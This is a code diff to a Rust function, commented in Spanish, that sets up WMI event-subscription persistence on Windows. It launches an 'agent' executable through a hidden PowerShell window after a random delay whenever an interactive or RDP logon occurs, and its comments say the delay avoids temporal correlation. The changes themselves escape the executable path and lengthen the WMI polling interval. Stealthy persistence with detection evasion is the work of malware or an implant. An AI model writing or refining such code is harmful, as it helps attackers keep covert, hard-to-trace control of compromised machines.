@@ -420,6 +420,9 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     // Usamos el PID como seed para variar entre instalaciones
     let delay_seconds = 120 + (pid % 181); // 120 + (0-180) = 120-300 segundos
     
+    // Escapar la ruta del exe para PowerShell (reemplazar ' por '')
+    let escaped_exe = exe_str.replace('\'', "''");
+    
     // Comando con delay usando PowerShell Start-Sleep antes de ejecutar
     // Esto hace que el agente no se inicie inmediatamente después del logon
     // sino que espere un tiempo aleatorio, evitando correlación temporal
@@ -429,7 +432,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     // 2. Ejecutar el agente en segundo plano
     let obfuscated_cmd = format!(
         "powershell.exe -WindowStyle Hidden -Command \"Start-Sleep -Seconds {}; Start-Process -WindowStyle Hidden -FilePath '{}'\"",
-        delay_seconds, exe_str
+        delay_seconds, escaped_exe
     );
     
     // WMI Event que se dispara cuando se crea una sesión de inicio de sesión
@@ -468,7 +471,8 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
             // Crear Event Filter - dispara cuando se crea una sesión de logon interactivo
             // __InstanceCreationEvent es más confiable que __InstanceModificationEvent para este caso
             // LogonType 2 = Interactive, 10 = RemoteInteractive (RDP)
-            "$Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 15 ",
+            // WITHIN 60 = polling cada 60 segundos (suficiente para eventos de logon poco frecuentes)
+            "$Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 ",
                 "WHERE TargetInstance ISA ''Win32_LogonSession'' ",
                 "AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 10)'; ",
             "$Filter = ([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance(); ",
